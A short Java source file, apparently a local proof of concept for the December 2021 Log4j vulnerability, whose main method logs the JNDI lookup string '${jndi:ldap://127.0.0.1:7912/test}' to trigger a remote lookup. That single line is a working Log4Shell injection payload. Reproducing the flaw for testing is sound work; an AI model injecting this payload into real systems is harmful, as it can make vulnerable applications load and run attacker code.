package me.hvkcoder.log4j2;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * @author h_vk
 * @describe
 * @since 2021/12/16
 */
public class Log4j {
    private static final Logger logger = LogManager.getLogger(Log4j.class);

    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:7912/test}");
    }
}
